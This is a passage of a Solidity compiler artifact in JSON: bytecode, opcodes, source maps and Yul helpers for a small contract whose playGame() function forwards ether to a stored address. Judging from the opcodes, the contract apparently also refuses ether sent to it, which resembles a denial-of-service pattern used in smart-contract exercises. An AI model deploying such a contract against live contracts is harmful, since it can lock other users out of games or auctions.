JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC8 PUSH8 0xDC7064C695A7338D PUSH15 0x465B15F9466D5BDA66C9D30BD04873 PUSH14 0xE4B773DB0164736F6C6343000800 STOP CALLER ",
							"sourceMap": "60:350:0:-:0;;;104:86;;;;;;;;;;;;;;;;;;;;;:::i;:::-;174:7;160:6;;:22;;;;;;;;;;;;;;;;;;104:86;60:350;;7:159:1;;103:6;97:13;88:22;;119:41;154:5;119:41;:::i;:::-;78:88;;;;:::o;172:300::-;;299:2;287:9;278:7;274:23;270:32;267:2;;;315:1;312;305:12;267:2;358:1;383:72;447:7;438:6;427:9;423:22;383:72;:::i;:::-;373:82;;329:136;257:215;;;;:::o;478:104::-;;552:24;570:5;552:24;:::i;:::-;541:35;;531:51;;;:::o;588:126::-;;665:42;658:5;654:54;643:65;;633:81;;;:::o;720:138::-;801:32;827:5;801:32;:::i;:::-;794:5;791:43;781:2;;848:1;845;838:12;781:2;771:87;:::o;60:350:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1754:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "153:157:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "163:73:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "229:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "234:1:1",
																		"type": "",
																		"value": "6"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "170:58:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "170:66:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "163:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "pos",
																				"nodeType": "YulIdentifier",
																				"src": "257:3:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "262:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "253:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "253:11:1"
																	},
																	{
																		"kind": "string",
																		"nodeType": "YulLiteral",
																		"src": "266:8:1",
																		"type": "",
																		"value": "not ok"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "246:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "246:29:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "246:29:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "285:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "296:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "301:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "292:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "292:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "285:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613_to_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "141:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "149:3:1",
														"type": ""
													}
												],
												"src": "7:303:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "479:134:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "489:90:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "572:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "577:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "496:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "496:83:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "489:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "589:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "600:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "605:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "596:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "596:11:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "589:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "467:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "475:3:1",
														"type": ""
													}
												],
												"src": "316:297:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "807:191:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "818:154:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "968:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "825:141:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "825:147:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "818:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "982:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "989:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "982:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "794:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "803:3:1",
														"type": ""
													}
												],
												"src": "619:379:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1175:248:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1185:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1197:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1208:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1193:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1193:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1185:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1232:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1243:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1228:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1228:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nodeType": "YulIdentifier",
																				"src": "1251:4:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1257:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1247:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1247:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1221:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1221:47:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1221:47:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1277:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nodeType": "YulIdentifier",
																		"src": "1411:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613_to_t_string_memory_ptr_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1285:124:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1285:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1277:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613__to_t_string_memory_ptr__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1155:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1170:4:1",
														"type": ""
													}
												],
												"src": "1004:419:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1542:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1552:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1567:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1552:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1514:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1519:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1530:11:1",
														"type": ""
													}
												],
												"src": "1429:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1678:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1695:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1700:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1688:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1688:19:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1688:19:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1716:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1735:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1740:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1731:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1731:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1716:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1650:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1655:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1666:11:1",
														"type": ""
													}
												],
												"src": "1582:169:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 6)\n\n        mstore(add(pos, 0), \"not ok\")\n\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, 0)\n\n        end := add(pos, 0)\n    }\n\n    function abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos ) -> end {\n\n        pos := abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack( pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_95287e1b0b3878226ee3a7a634a45317c61b39ae8b901ed8e53fbb8f5afbb613_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100225760003560e01c8063af899735146100315761002c565b3661002c57600080fd5b600080fd5b61003961003b565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163460405161008290610165565b60006040518083038185875af1925050503d80600081146100bf576040519150601f19603f3d011682016040523d82523d6000602084013e6100c4565b606091505b5050905080610108576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100ff9061017a565b60405180910390fd5b50565b60006101186006836101a5565b91507f6e6f74206f6b00000000000000000000000000000000000000000000000000006000830152602082019050919050565b600061015860008361019a565b9150600082019050919050565b60006101708261014b565b9150819050919050565b600060208201905081810360008301526101938161010b565b9050919050565b600081905092915050565b60008282526020820190509291505056fea2646970667358221220c867dc7064c695a7338d6e465b15f9466d5bda66c9d30bd048736de4b773db0164736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x22 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAF899735 EQ PUSH2 0x31 JUMPI PUSH2 0x2C JUMP JUMPDEST CALLDATASIZE PUSH2 0x2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x39 PUSH2 0x3B JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLVALUE PUSH1 0x40 MLOAD PUSH2 0x82 SWAP1 PUSH2 0x165 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xBF JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xC4 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x108 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFF SWAP1 PUSH2 0x17A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x118 PUSH1 0x6 DUP4 PUSH2 0x1A5 JUMP JUMPDEST SWAP2 POP PUSH32 0x6E6F74206F6B0000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x158 PUSH1 0x0 DUP4 PUSH2 0x19A JUMP JUMPDEST SWAP2 POP PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x170 DUP3 PUSH2 0x14B JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x193 DUP2 PUSH2 0x10B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC8 PUSH8 0xDC7064C695A7338D PUSH15 0x465B15F9466D5BDA66C9D30BD04873 PUSH14 0xE4B773DB0164736F6C6343000800 STOP CALLER ",
							"sourceMap": "60:350:0:-:0;;;;;;;;;;;;;;;;;;;;;;;391:8;;;60:350;;;;198:142;;;:::i;:::-;;;247:7;266:6;;;;;;;;;;;258:20;;286:9;258:42;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;246:54;;;319:2;311:21;;;;;;;;;;;;:::i;:::-;;;;;;;;;198:142;:::o;7:303:1:-;;170:66;234:1;229:3;170:66;:::i;:::-;163:73;;266:8;262:1;257:3;253:11;246:29;301:2;296:3;292:12;285:19;;153:157;;;:::o;316:297::-;;496:83;577:1;572:3;496:83;:::i;:::-;489:90;;605:1;600:3;596:11;589:18;;479:134;;;:::o;619:379::-;;825:147;968:3;825:147;:::i;:::-;818:154;;989:3;982:10;;807:191;;;:::o;1004:419::-;;1208:2;1197:9;1193:18;1185:26;;1257:9;1251:4;1247:20;1243:1;1232:9;1228:17;1221:47;1285:131;1411:4;1285:131;:::i;:::-;1277:139;;1175:248;;;:::o;1429:147::-;;1567:3;1552:18;;1542:34;;;;:::o;1582:169::-;;1700:6;1695:3;1688:19;1740:4;1735:3;1731:14;1716:29;;1678:73;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "98400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"playGame()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 60,
									"end": 410,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 60,
									"end": 410,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 60,
									"end": 410,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 104,
									"end": 190,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 174,
									"end": 181,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 160,
									"end": 166,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 160,
									"end": 166,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 160,
									"end": 182,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 160,
									"end": 182,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 160,
									"end": 182,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 160,
									"end": 182,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 104,
									"end": 190,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 60,
									"end": 410,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "5"
								},
								{
									"begin": 60,
									"end": 410,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 7,
									"end": 166,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 7,
									"end": 166,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 7,
									"end": 166,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 103,
									"end": 109,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 97,
									"end": 110,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 88,
									"end": 110,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 88,
									"end": 110,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 119,
									"end": 160,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 154,
									"end": 159,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 119,
									"end": 160,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 119,
									"end": 160,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 78,
									"end": 166,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 172,
									"end": 472,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 172,
									"end": 472,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 172,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 299,
									"end": 301,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 287,
									"end": 296,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 278,
									"end": 285,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 274,
									"end": 297,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 270,
									"end": 302,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 267,
									"end": 269,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 315,
									"end": 316,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 312,
									"end": 313,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 305,
									"end": 317,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 267,
									"end": 269,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 267,
									"end": 269,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 358,
									"end": 359,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 447,
									"end": 454,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 438,
									"end": 444,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 427,
									"end": 436,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 423,
									"end": 445,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 383,
									"end": 455,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 383,
									"end": 455,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 373,
									"end": 455,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 373,
